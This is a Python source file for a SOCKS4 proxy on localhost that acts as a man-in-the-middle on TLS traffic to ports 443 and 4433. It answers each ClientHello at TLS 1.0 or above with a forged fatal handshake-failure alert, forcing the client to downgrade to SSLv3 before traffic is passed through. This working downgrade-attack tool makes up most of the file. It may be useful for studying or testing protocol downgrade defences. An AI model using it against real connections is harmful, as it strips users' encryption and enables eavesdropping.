import socketserver
import socket
import select
import os

from tls import Message, build_fatal_alert, AlertDescription
from tls import ContentType, HandshakeType, CipherSuite, ProtocolVersion

MAX = 8192

# transform functions take the from-local and from-remote data,
# and return the to-local and to-remote data, plus the next transform
"""
while True:

m = Message.read(self.rfile)
self.wfile.write(bytes(build_fatal_alert(AlertDescription.HandshakeFailure)))
self.rfile.close()
self.wfile.close()

assert m.type == ContentType.Handshake
print('TLS version:', ProtocolVersion.tostring(m.version))
assert m.body.type == HandshakeType.ClientHello
for cs in m.body.body.ciphersuites:
    print(CipherSuite.lookup(cs))
print('---')
"""

def tls_mitm_transform(from_front, from_back):
    if from_front:
        m = Message.decode(from_front)
        if m.type == ContentType.Handshake and m.body.type == HandshakeType.ClientHello:
            print('message version:', ProtocolVersion.tostring(m.version))
            print('clienthello max version:', ProtocolVersion.tostring(m.body.body.version))
            if m.version >= ProtocolVersion.TLSv1_0:
                print('rejecting handshake to encourage downgrade')
                return bytes(build_fatal_alert(AlertDescription.HandshakeFailure)), None, tls_mitm_transform
            else:
                print('downgrade succeeded, allowing handshake')
                return from_back, from_front, null_transform

    return from_back, from_front, tls_mitm_transform
    
def null_transform(from_front, from_back):
    return from_back, from_front, null_transform

def echo_transform(from_front, from_back):
    return from_front, from_back, echo_transform

class socks_handler(socketserver.BaseRequestHandler):
    def handle(self):
        print('socks client connected from', self.client_address)
        
        req = self.request.recv(9)
        ver, cmd, port, ip, nul = req[0], req[1], req[2:4], req[4:8], req[8]
        assert ver == 0x04
        assert cmd == 0x01
        assert nul == 0x00
        
        ip = '{0}.{1}.{2}.{3}'.format(*ip)
        port = port[0] << 8 | port[1]
        
        print('connect to {0}:{1}'.format(ip, port))
        backend = socket.create_connection((ip, port))
        print('connected')

        self.request.sendall(bytes([0, 0x5a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]))

        if port == 443 or port == 4433:
            transform = tls_mitm_transform
        else:
            transform = null_transform

        def dispatch(from_front, from_back, transform):
            to_front, to_back, transform = transform(from_front, from_back)
            if to_front:
                print('<-', len(to_front))
                self.request.sendall(to_front)
            if to_back:
                print('->', len(to_back))
                backend.sendall(to_back)
            return transform

        try:
            while True:
                r, w, x = select.select([backend, self.request],
                                        [],
                                        [backend, self.request],
                                        1)

                if x:
                    raise IOError('socket error: {0}'.format(x))

                if backend in r:
                    packet = backend.recv(MAX)
                    if len(packet) == 0:
                        print('eof from back')
                        break

                    transform = dispatch(None, packet, transform)
                
                if self.request in r:
                    packet = self.request.recv(MAX)
                    if len(packet) == 0:
                        print('eof from front')
                        break

                    transform = dispatch(packet, None, transform)
        except KeyboardInterrupt:
            os._exit(1)
        finally:
            print('closing')
            backend.close()
            self.request.close()
        
class RebindTCP(socketserver.ThreadingMixIn, socketserver.TCPServer):
    def __init__(self, *args, **kwargs):
        self.allow_reuse_address = True
        socketserver.TCPServer.__init__(self, *args, **kwargs)

if __name__ == '__main__':
    HOST, PORT = 'localhost', 3355

    server = RebindTCP((HOST, PORT), socks_handler)
    server.serve_forever()
